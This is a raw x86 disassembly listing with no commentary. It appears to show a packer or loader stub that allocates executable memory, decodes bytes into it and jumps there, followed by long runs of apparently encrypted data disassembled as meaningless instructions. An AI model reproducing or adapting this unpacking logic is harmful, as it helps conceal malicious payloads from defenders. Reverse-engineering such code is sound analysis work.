  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	lea    ecx,[ebp-0x14]
  42165c:	push   ecx
  42165d:	call   DWORD PTR ds:0x428004
  421663:	mov    BYTE PTR [ebp-0x40],0x56
  421667:	call   DWORD PTR ds:0x428014
  42166d:	mov    DWORD PTR [ebp-0x2c],eax
  421670:	mov    BYTE PTR [ebp-0x3e],0x72
  421674:	movzx  edx,WORD PTR [ebp-0x2c]
  421678:	test   edx,edx
  42167a:	jne    0x4216bc
  42167c:	mov    BYTE PTR [ebp-0x34],0x0
  421680:	mov    DWORD PTR [ebp-0x14],0xe0d
  421687:	lea    eax,[ebp-0x28]
  42168a:	push   eax
  42168b:	call   DWORD PTR ds:0x428018
  421691:	mov    DWORD PTR [ebp-0x68],eax
  421694:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169b:	lea    ecx,[ebp-0x40]
  42169e:	push   ecx
  42169f:	mov    edx,DWORD PTR [ebp-0x68]
  4216a2:	push   edx
  4216a3:	call   DWORD PTR ds:0x42801c
  4216a9:	mov    DWORD PTR [ebp-0x44],eax
  4216ac:	mov    DWORD PTR [ebp-0x8],0xe9da91e8
  4216b3:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ba:	jmp    0x4216d1
  4216bc:	mov    BYTE PTR ds:0x443a58,0x0
  4216c3:	mov    BYTE PTR ds:0x42bb88,0x0
  4216ca:	mov    BYTE PTR ds:0x441b18,0x0
  4216d1:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216d8:	push   DWORD PTR ds:0x428018
  4216de:	pop    edx
  4216df:	mov    DWORD PTR [ebp-0x74],edx
  4216e2:	push   DWORD PTR [ebp-0x30]
  4216e5:	push   0x1000
  4216ea:	mov    eax,DWORD PTR [ebp-0x14]
  4216ed:	add    eax,0x23
  4216f0:	add    eax,0x23
  4216f3:	push   eax
  4216f4:	xor    eax,eax
  4216f6:	push   eax
  4216f7:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fa:	call   ecx
  4216fc:	mov    edx,eax
  4216fe:	mov    DWORD PTR [ebp-0x4],edx
  421701:	mov    eax,DWORD PTR [ebp-0x70]
  421704:	sub    eax,0xdae0b
  421709:	mov    DWORD PTR [ebp-0x70],eax
  42170c:	cmp    DWORD PTR [ebp-0x4],0x0
  421710:	jne    0x421719
  421712:	mov    BYTE PTR ds:0x441b18,0x0
  421719:	mov    ecx,DWORD PTR [ebp-0x4]
  42171c:	add    ecx,DWORD PTR [ebp-0x14]
  42171f:	mov    edx,DWORD PTR [ebp-0x8]
  421722:	mov    DWORD PTR [ecx],edx
  421724:	mov    eax,DWORD PTR [ebp-0x4]
  421727:	add    eax,DWORD PTR [ebp-0x5c]
  42172a:	mov    DWORD PTR [ebp-0x64],eax
  42172d:	mov    ecx,DWORD PTR ds:0x42801c
  421733:	mov    DWORD PTR [ebp-0x54],ecx
  421736:	mov    edx,DWORD PTR [ebp-0x4]
  421739:	add    edx,DWORD PTR [ebp-0x14]
  42173c:	mov    eax,DWORD PTR [ebp+0x8]
  42173f:	mov    DWORD PTR [edx+0x4],eax
  421742:	mov    ecx,DWORD PTR [ebp-0x4]
  421745:	add    ecx,DWORD PTR [ebp-0x14]
  421748:	mov    DWORD PTR [ebp-0xc],ecx
  42174b:	cmp    DWORD PTR [ebp-0x70],0x0
  42174f:	jbe    0x42176c
  421751:	mov    edx,DWORD PTR [ebp-0xc]
  421754:	push   edx
  421755:	mov    eax,DWORD PTR [ebp-0x14]
  421758:	push   eax
  421759:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175c:	add    ecx,DWORD PTR [ebp-0x70]
  42175f:	push   ecx
  421760:	mov    edx,DWORD PTR [ebp-0x4]
  421763:	push   edx
  421764:	call   0x4214d0
  421769:	add    esp,0x10
  42176c:	cmp    DWORD PTR [ebp-0x64],0x0
  421770:	je     0x421784
  421772:	mov    ecx,DWORD PTR [ebp-0x54]
  421775:	push   ecx
  421776:	push   DWORD PTR [ebp-0x74]
  421779:	mov    esi,DWORD PTR [ebp-0x64]
  42177c:	push   edx
  42177d:	pop    eax
  42177e:	push   ecx
  42177f:	nop
  421780:	jmp    esi
  421782:	jmp    0x42178a
  421784:	mov    eax,DWORD PTR [ebp+0x8]
  421787:	mov    DWORD PTR [ebp-0x18],eax
  42178a:	mov    eax,0x1
  42178f:	pop    esi
  421790:	mov    esp,ebp
  421792:	pop    ebp
  421793:	ret    
  421794:	int3   
  421795:	int3   
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0xb4023953
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	call   DWORD PTR [ecx-0x2e]
  421830:	pop    eax
  421831:	push   ss
  421832:	add    ecx,DWORD PTR [ecx]
  421834:	sti    
  421835:	scas   eax,DWORD PTR es:[edi]
  421836:	mov    DWORD PTR [eax+0x5e],edx
  421839:	cld    
  42183a:	mul    ebx
  42183c:	mov    al,cl
  42183e:	scas   al,BYTE PTR es:[edi]
  42183f:	add    BYTE PTR [ecx],cl
  421841:	sti    
  421842:	scas   eax,DWORD PTR es:[edi]
  421843:	lea    edx,[eax+0x5e]
  421846:	mov    esp,0xc8881c08
  42184b:	push   ss
  42184c:	add    BYTE PTR [ecx],cl
  42184e:	sti    
  42184f:	scas   eax,DWORD PTR es:[edi]
  421850:	lea    edx,[eax+0x5e]
  421853:	cld    
  421854:	or     BYTE PTR [eax+ecx*4],bl
  421857:	enter  0x16,0x9
  42185b:	sti    
  42185c:	scas   eax,DWORD PTR es:[edi]
  42185d:	lea    edx,[eax+0x5e]
  421860:	cld    
  421861:	or     BYTE PTR [eax+ecx*4],bl
  421864:	enter  0x16,0x9
  421868:	sti    
  421869:	scas   eax,DWORD PTR es:[edi]
  42186a:	jne    0x4218bc
  42186c:	pop    esi
  42186d:	cld    
  42186e:	push   es
  42186f:	add    esi,DWORD PTR [edx]
  421871:	(bad)  
  421872:	push   ss
  421873:	mov    ah,0x0
  421875:	mov    ?,WORD PTR ss:0x29311251
  42187c:	dec    eax
  42187d:	loopne 0x421820
  42187f:	and    BYTE PTR gs:[ecx-0x77],bh
  421883:	shr    dl,0x22
  421886:	aas    
  421887:	xchg   ecx,eax
  421888:	sub    BYTE PTR [edi-0x17],bh
  42188b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42188c:	js     0x4218fd
  42188e:	jge    0x42186b
  421890:	int    0xe8
  421892:	jo     0x4218c0
  421894:	mov    DWORD PTR [esi+0x3c],esp
  421897:	loope  0x42183f
  421899:	ss inc esp
  42189b:	inc    esi
  42189c:	test   al,0x8f
  42189e:	loopne 0x4218df
  4218a0:	cmp    bl,BYTE PTR [ecx-0x3d7aeeda]
  4218a6:	xor    al,BYTE PTR [eax]
  4218a8:	or     ebx,edi
  4218aa:	scas   eax,DWORD PTR es:[edi]
  4218ab:	lea    edx,[eax+0x5e]
  4218ae:	sti    
  4218af:	xchg   ecx,eax
  4218b0:	loopne 0x421883
  4218b2:	mov    ebp,esi
  4218b4:	xchg   edx,eax
  4218b5:	add    edi,DWORD PTR [eax+0x1d5a1f57]
  4218bb:	add    al,0x9a
  4218bd:	push   ss
  4218be:	shr    BYTE PTR [ebp+0x3560a1a],1
  4218c4:	cmp    eax,0xc43b0887
  4218c9:	add    bl,dh
  4218cb:	jo     0x421927
  4218cd:	sbb    al,0x58
  4218cf:	ins    BYTE PTR es:[edi],dx
  4218d0:	ret    0xe5a5
  4218d3:	test   al,0xcc
  4218d5:	mul    BYTE PTR [edx+edx*4]
  4218d8:	mov    cl,0xc2
  4218da:	push   eax
  4218db:	clc    
  4218dc:	fwait
  4218dd:	icebp  
  4218de:	in     eax,0xd
  4218e0:	inc    ecx
  4218e1:	push   esp
  4218e2:	mov    dh,0xf0
  4218e4:	mov    es,WORD PTR [edx+0x3019682]
  4218ea:	mov    ds:0x1d5a1f57,eax
  4218ef:	add    al,0x9b
  4218f1:	push   ss
  4218f2:	mov    al,ds:0xb60a8431
  4218f7:	and    ebp,DWORD PTR [edi]
  4218f9:	xchg   DWORD PTR ds:0x44026ea6,ebx
  4218ff:	in     eax,dx
  421900:	cmc    
  421901:	sbb    al,0x8
  421903:	icebp  
  421904:	imul   esp,DWORD PTR [ebp-0x9a9ca2b],0xc21ae44a
  42190e:	dec    esi
  42190f:	gs push es
  421911:	icebp  
  421912:	in     eax,dx
  421913:	jne    0x4218d7
  421915:	push   esp
  421916:	scas   al,BYTE PTR es:[edi]
  421917:	popa   
  421918:	jg     0x4218fa
  42191a:	mov    ebp,esi
  42191c:	xchg   edx,eax
  42191d:	add    edi,ebx
  42191f:	scas   eax,DWORD PTR es:[edi]
  421920:	lea    edx,[eax+0x5e]
  421923:	cld    
  421924:	or     BYTE PTR [eax+ebx*8],bl
  421927:	lea    edx,[esi]
  421929:	add    BYTE PTR [ebp-0x6],al
  42192c:	lods   eax,DWORD PTR ds:[esi]
  42192d:	lea    edi,[ebp+edi*4-0x77e3b85d]
  421934:	enter  0x16,0x9
  421938:	sti    
  421939:	scas   eax,DWORD PTR es:[edi]
  42193a:	ins    DWORD PTR es:[edi],dx
  42193b:	push   eax
  42193c:	pop    ebp
  42193d:	std    
  42193e:	add    ebx,DWORD PTR ds:0xec16c882
  421944:	or     eax,0x5689affb
  421949:	pop    esi
  42194a:	cld    
  42194b:	or     BYTE PTR [eax+ecx*4],bl
  42194e:	leave  
  42194f:	stos   DWORD PTR es:[edi],eax
  421950:	add    BYTE PTR [ecx],cl
  421952:	sti    
  421953:	mov    edi,0xfc5e508d
  421958:	or     eax,0x57c8881c
  42195d:	add    BYTE PTR [ecx],cl
  42195f:	jmp    0x421910
  421961:	lea    edx,[eax+0x5c]
  421964:	cld    
  421965:	or     BYTE PTR [ecx],bl
  421967:	mov    cl,cl
  421969:	push   ss
  42196a:	add    BYTE PTR [ecx],cl
  42196c:	sti    
  42196d:	scas   eax,DWORD PTR es:[edi]
  42196e:	mov    BYTE PTR [eax+0x5f],dl
  421971:	cld    
  421972:	or     BYTE PTR [eax+ecx*4],bl
  421975:	enter  0x8016,0x2
  421979:	sti    
  42197a:	scas   eax,DWORD PTR es:[edi]
  42197b:	mov    DWORD PTR [eax+0x5e],edx
  42197e:	inc    ecx
  42197f:	cmp    DWORD PTR [ecx],ebx
  421981:	mov    dl,cl
  421983:	push   ss
  421984:	add    BYTE PTR [ecx+0x509daffb],cl
  42198a:	pop    esi
  42198b:	in     al,dx
  42198c:	or     BYTE PTR [eax+ecx*4],bl
  42198f:	enter  0x6,0x9
  421993:	jmp    0x421944
  421995:	lea    edx,[eax+0x5e]
  421998:	cld    
  421999:	or     BYTE PTR [eax+ecx*4],cl
  42199c:	enter  0x16,0x9
  4219a0:	sti    
  4219a1:	scas   eax,DWORD PTR es:[edi]
  4219a2:	lea    edx,[eax+0x5e]
  4219a5:	cld    
  4219a6:	mov    WORD PTR [edx-0x7d],?
  4219a9:	enter  0x37f,0x9
  4219ad:	sti    
  4219ae:	scas   eax,DWORD PTR es:[edi]
  4219af:	mov    ebp,0x35335e5b
  4219b4:	sbb    al,0x88
  4219b6:	enter  0x16,0x9
  4219ba:	sti    
  4219bb:	scas   eax,DWORD PTR es:[edi]
  4219bc:	lea    edx,[eax+0x5e]
  4219bf:	cld    
  4219c0:	or     BYTE PTR [eax+ecx*4],bl
  4219c3:	enter  0x16,0x9
  4219c7:	sti    
  4219c8:	scas   eax,DWORD PTR es:[edi]
  4219c9:	lea    edx,[eax+0x5e]
  4219cc:	cld    
  4219cd:	or     BYTE PTR [eax+ecx*4],bl
  4219d0:	enter  0x16,0x9
  4219d4:	sti    
  4219d5:	scas   eax,DWORD PTR es:[edi]
  4219d6:	lea    edx,[eax+0x5e]
  4219d9:	cld    
  4219da:	or     BYTE PTR [eax+ecx*4],bl
  4219dd:	enter  0x16,0x9
  4219e1:	sti    
  4219e2:	scas   eax,DWORD PTR es:[edi]
  4219e3:	lea    edx,[eax+0x5e]
  4219e6:	cld    
  4219e7:	or     BYTE PTR [eax+ecx*4],bl
  4219ea:	enter  0x16,0x9
  4219ee:	sti    
  4219ef:	scas   eax,DWORD PTR es:[edi]
  4219f0:	lea    edx,[eax+0x5e]
  4219f3:	cld    
  4219f4:	or     BYTE PTR [eax+ecx*4],bl
  4219f7:	enter  0x16,0x9
  4219fb:	sti    
  4219fc:	scas   eax,DWORD PTR es:[edi]
  4219fd:	lea    edx,[eax+0x5e]
  421a00:	cld    
  421a01:	or     BYTE PTR [eax+ecx*4],bl
  421a04:	enter  0x16,0x9
  421a08:	sti    
  421a09:	scas   eax,DWORD PTR es:[edi]
  421a0a:	lea    edx,[eax+0x5e]
  421a0d:	cld    
  421a0e:	or     BYTE PTR [eax+ecx*4],bl
  421a11:	enter  0x16,0x9
  421a15:	sti    
  421a16:	scas   eax,DWORD PTR es:[edi]
  421a17:	lea    edx,[eax+0x5e]
  421a1a:	cld    
  421a1b:	or     BYTE PTR [eax+ecx*4],bl
  421a1e:	out    0x62,al
  421a20:	gs jno 0x4219b2
  421a23:	scas   eax,DWORD PTR es:[edi]
  421a24:	lea    edx,[eax+0x5e]
  421a27:	fadd   QWORD PTR [ebx]
  421a29:	sbb    al,0x88
  421a2b:	fcom   DWORD PTR [esi]
  421a2d:	add    BYTE PTR [ecx],cl
  421a2f:	shr    DWORD PTR [ebx-0x3a5af73],0x8
  421a36:	dec    esp
  421a37:	int    0x8b
  421a39:	and    al,0x54
  421a3b:	inc    esi
  421a3c:	sti    
  421a3d:	scas   eax,DWORD PTR es:[edi]
  421a3e:	lea    edx,[eax+0x5e]
  421a41:	cld    
  421a42:	sub    BYTE PTR [eax+ecx*4],bl
  421a45:	sub    BYTE PTR [eax],bh
  421a47:	jb     0x421ac3
  421a49:	mov    esp,ecx
  421a4b:	lea    edx,[eax+0x5e]
  421a4e:	cld    
  421a4f:	pop    eax
  421a50:	sbb    al,0x88
  421a52:	enter  0xb26,0x9
  421a56:	sti    
  421a57:	dec    DWORD PTR [ebp+0xcc25e50]
  421a5d:	sbb    al,0x88
  421a5f:	enter  0x16,0x9
  421a63:	sti    
  421a64:	scas   eax,DWORD PTR es:[edi]
  421a65:	lea    edx,[eax+0x5e]
  421a68:	cld    
  421a69:	or     BYTE PTR [eax+ecx*4],bh
  421a6c:	enter  0xf6,0x9
  421a70:	sti    
  421a71:	scas   eax,DWORD PTR es:[edi]
  421a72:	lea    edx,[eax+0x5e]
  421a75:	cld    
  421a76:	or     BYTE PTR [eax+ecx*4],bl
  421a79:	enter  0x16,0x9
  421a7d:	sti    
  421a7e:	scas   eax,DWORD PTR es:[edi]
  421a7f:	lea    edx,[eax+0x5e]
  421a82:	cld    
  421a83:	or     BYTE PTR [eax+ecx*4],bl
  421a86:	enter  0x16,0x9
  421a8a:	sti    
  421a8b:	scas   eax,DWORD PTR es:[edi]
  421a8c:	lea    edx,[eax+0x5e]
  421a8f:	cld    
  421a90:	or     BYTE PTR [eax+ecx*4],bl
  421a93:	enter  0x16,0x9
  421a97:	sti    
  421a98:	scas   eax,DWORD PTR es:[edi]
  421a99:	lea    edx,[eax+0x5e]
  421a9c:	cld    
  421a9d:	or     BYTE PTR [eax+ecx*4],bl
  421aa0:	enter  0x16,0x9
  421aa4:	sti    
  421aa5:	scas   eax,DWORD PTR es:[edi]
  421aa6:	lea    edx,[eax+0x5e]
  421aa9:	cld    
  421aaa:	or     BYTE PTR [eax+ecx*4],bl
  421aad:	enter  0x16,0x9
  421ab1:	sti    
  421ab2:	scas   eax,DWORD PTR es:[edi]
  421ab3:	lea    edx,[eax+0x5e]
  421ab6:	cld    
  421ab7:	or     BYTE PTR [eax+ecx*4],bl
  421aba:	enter  0x16,0x9
  421abe:	sti    
  421abf:	scas   eax,DWORD PTR es:[edi]
  421ac0:	lea    edx,[eax+0x5e]
  421ac3:	cld    
  421ac4:	or     BYTE PTR [eax+ecx*4],bl
  421ac7:	enter  0x16,0x9
  421acb:	sti    
  421acc:	scas   eax,DWORD PTR es:[edi]
  421acd:	lea    edx,[eax+0x5e]
  421ad0:	cld    
  421ad1:	or     BYTE PTR [eax+ecx*4],bl
  421ad4:	enter  0x16,0x9
  421ad8:	sti    
  421ad9:	scas   eax,DWORD PTR es:[edi]
  421ada:	lea    edx,[eax+0x5e]
  421add:	cld    
  421ade:	or     BYTE PTR [eax+ecx*4],bl
  421ae1:	enter  0x16,0x9
  421ae5:	sti    
  421ae6:	scas   eax,DWORD PTR es:[edi]
  421ae7:	lea    edx,[eax+0x5e]
  421aea:	cld    
  421aeb:	or     BYTE PTR [eax+ecx*4],bl
  421aee:	enter  0x16,0x9
  421af2:	sti    
  421af3:	scas   eax,DWORD PTR es:[edi]
  421af4:	lea    edx,[eax+0x5e]
  421af7:	cld    
  421af8:	or     BYTE PTR [eax+ecx*4],bl
  421afb:	enter  0x16,0x9
  421aff:	sti    
  421b00:	scas   eax,DWORD PTR es:[edi]
  421b01:	lea    edx,[eax+0x5e]
  421b04:	cld    
  421b05:	or     BYTE PTR [eax+ecx*4],bl
  421b08:	enter  0x16,0x9
  421b0c:	sti    
  421b0d:	scas   eax,DWORD PTR es:[edi]
  421b0e:	lea    edx,[eax+0x5e]
  421b11:	cld    
  421b12:	or     BYTE PTR [eax+ecx*4],bl
  421b15:	enter  0x16,0x9
  421b19:	sti    
  421b1a:	scas   eax,DWORD PTR es:[edi]
  421b1b:	lea    edx,[eax+0x5e]
  421b1e:	cld    
  421b1f:	or     BYTE PTR [eax+ecx*4],bl
  421b22:	enter  0x16,0x9
  421b26:	sti    
  421b27:	scas   eax,DWORD PTR es:[edi]
  421b28:	lea    edx,[eax+0x5e]
  421b2b:	cld    
  421b2c:	or     BYTE PTR [eax+ecx*4],bl
  421b2f:	enter  0x16,0x9
  421b33:	sti    
  421b34:	scas   eax,DWORD PTR es:[edi]
  421b35:	lea    edx,[eax+0x5e]
  421b38:	cld    
  421b39:	or     BYTE PTR [eax+ecx*4],bl
  421b3c:	enter  0x16,0x9
  421b40:	sti    
  421b41:	scas   eax,DWORD PTR es:[edi]
  421b42:	lea    edx,[eax+0x5e]
  421b45:	cld    
  421b46:	or     BYTE PTR [eax+ecx*4],bl
  421b49:	enter  0x16,0x9
  421b4d:	sti    
  421b4e:	scas   eax,DWORD PTR es:[edi]
  421b4f:	lea    edx,[eax+0x5e]
  421b52:	cld    
  421b53:	or     BYTE PTR [eax+ecx*4],bl
  421b56:	enter  0x16,0x9
  421b5a:	sti    
  421b5b:	scas   eax,DWORD PTR es:[edi]
  421b5c:	lea    edx,[eax+0x5e]
  421b5f:	cld    
  421b60:	or     BYTE PTR [eax+ecx*4],bl
  421b63:	enter  0x16,0x9
  421b67:	sti    
  421b68:	scas   eax,DWORD PTR es:[edi]
  421b69:	lea    edx,[eax+0x5e]
  421b6c:	cld    
  421b6d:	or     BYTE PTR [eax+ecx*4],bl
  421b70:	enter  0x16,0x9
  421b74:	sti    
  421b75:	scas   eax,DWORD PTR es:[edi]
  421b76:	lea    edx,[eax+0x5e]
  421b79:	cld    
  421b7a:	or     BYTE PTR [eax+ecx*4],bl
  421b7d:	enter  0x16,0x9
  421b81:	sti    
  421b82:	scas   eax,DWORD PTR es:[edi]
  421b83:	lea    edx,[eax+0x5e]
  421b86:	cld    
  421b87:	or     BYTE PTR [eax+ecx*4],bl
  421b8a:	enter  0x16,0x9
  421b8e:	sti    
  421b8f:	scas   eax,DWORD PTR es:[edi]
  421b90:	lea    edx,[eax+0x5e]
  421b93:	cld    
  421b94:	or     BYTE PTR [eax+ecx*4],bl
  421b97:	enter  0x16,0x9
  421b9b:	sti    
  421b9c:	scas   eax,DWORD PTR es:[edi]
  421b9d:	lea    edx,[eax+0x5e]
  421ba0:	cld    
  421ba1:	or     BYTE PTR [eax+ecx*4],bl
  421ba4:	enter  0x16,0x9
  421ba8:	sti    
  421ba9:	scas   eax,DWORD PTR es:[edi]
  421baa:	lea    edx,[eax+0x5e]
  421bad:	cld    
  421bae:	or     BYTE PTR [eax+ecx*4],bl
  421bb1:	enter  0x16,0x9
  421bb5:	sti    
  421bb6:	scas   eax,DWORD PTR es:[edi]
  421bb7:	lea    edx,[eax+0x5e]
  421bba:	cld    
  421bbb:	or     BYTE PTR [eax+ecx*4],bl
  421bbe:	enter  0x16,0x9
  421bc2:	sti    
  421bc3:	scas   eax,DWORD PTR es:[edi]
  421bc4:	lea    edx,[eax+0x5e]
  421bc7:	cld    
  421bc8:	or     BYTE PTR [eax+ecx*4],bl
  421bcb:	enter  0x16,0x9
  421bcf:	sti    
  421bd0:	scas   eax,DWORD PTR es:[edi]
  421bd1:	lea    edx,[eax+0x5e]
  421bd4:	cld    
  421bd5:	or     BYTE PTR [eax+ecx*4],bl
  421bd8:	enter  0x16,0x9
  421bdc:	sti    
  421bdd:	scas   eax,DWORD PTR es:[edi]
  421bde:	lea    edx,[eax+0x5e]
  421be1:	cld    
  421be2:	or     BYTE PTR [eax+ecx*4],bl
  421be5:	enter  0x16,0x9
  421be9:	sti    
  421bea:	scas   eax,DWORD PTR es:[edi]
  421beb:	lea    edx,[eax+0x5e]
  421bee:	cld    
  421bef:	or     BYTE PTR [eax+ecx*4],bl
  421bf2:	enter  0x16,0x9
  421bf6:	sti    
  421bf7:	scas   eax,DWORD PTR es:[edi]
  421bf8:	lea    edx,[eax+0x5e]
  421bfb:	cld    
  421bfc:	or     BYTE PTR [eax+ecx*4],bl
  421bff:	enter  0x16,0x9
  421c03:	sti    
  421c04:	scas   eax,DWORD PTR es:[edi]
  421c05:	lea    edx,[eax+0x5e]
  421c08:	cld    
  421c09:	or     BYTE PTR [eax+ecx*4],bl
  421c0c:	enter  0x16,0x9
  421c10:	sti    
  421c11:	scas   eax,DWORD PTR es:[edi]
  421c12:	lea    edx,[eax+0x5e]
  421c15:	cld    
  421c16:	or     BYTE PTR [eax+ecx*4],bl
  421c19:	enter  0x16,0x9
  421c1d:	sti    
  421c1e:	scas   eax,DWORD PTR es:[edi]
  421c1f:	lea    edx,[eax+0x5e]
  421c22:	cld    
  421c23:	or     BYTE PTR [eax+ecx*4],bl
  421c26:	enter  0x16,0x9
  421c2a:	sti    
  421c2b:	scas   eax,DWORD PTR es:[edi]
  421c2c:	lea    edx,[eax+0x19]
  421c2f:	adc    al,BYTE PTR [edx]
  421c31:	sbb    al,0xa7
  421c33:	enter  0x1016,0x9
  421c37:	sti    
  421c38:	test   DWORD PTR [edi],ebp
  421c3a:	mov    ch,BYTE PTR [edi]
  421c3c:	call   0xed46:0x4f1631f7
  421c43:	aas    
  421c44:	adc    edi,DWORD PTR [ecx+edi*1-0x7372c73b]
  421c4b:	inc    esi
  421c4c:	fwait
  421c4d:	jns    0x421bf0
  421c4f:	push   ss
  421c50:	fs pop ds
  421c52:	and    eax,0x9e70960c
  421c57:	cwde   
  421c58:	and    esi,DWORD PTR [ecx+0x1eb159fb]
  421c5e:	fldcw  WORD PTR [edi-0x56290856]
  421c64:	pop    ecx
  421c65:	jno    0x421c88
  421c67:	cli    
  421c68:	sub    ebx,ebp
  421c6a:	sbb    eax,0xb9dcf4a
  421c6f:	js     0x421c5e
  421c71:	out    0x75,eax
  421c73:	sub    DWORD PTR [ecx+esi*8+0x223c25ba],esp
  421c7a:	fldcw  WORD PTR [esi-0x7a3a7398]
  421c80:	mov    ch,BYTE PTR [eax-0x21]
  421c83:	add    al,0x9e
  421c85:	adc    BYTE PTR [eax+0x4d432591],0xa6
  421c8c:	retf   
  421c8d:	adc    edx,DWORD PTR [eax]
  421c8f:	push   ecx
  421c90:	dec    edx
  421c91:	add    eax,0xeae1a2b2
  421c96:	aam    0xf1
  421c98:	inc    eax
  421c99:	loop   0x421d09
  421c9b:	aas    
  421c9c:	sub    ecx,DWORD PTR [edx]
  421c9e:	ins    BYTE PTR es:[edi],dx
  421c9f:	lods   eax,DWORD PTR ds:[esi]
  421ca0:	sbb    DWORD PTR [esi-0x32],ecx
  421ca3:	sahf   
  421ca4:	pushf  
  421ca5:	ficom  WORD PTR [edi-0x35]
  421ca8:	sub    al,0xf4
  421caa:	jmp    0x556ecd88
  421caf:	jnp    0x421caf
  421cb1:	clc    
  421cb2:	jecxz  0x421c4b
  421cb4:	push   ss
  421cb5:	mov    esp,?
  421cb7:	xlat   BYTE PTR ds:[ebx]
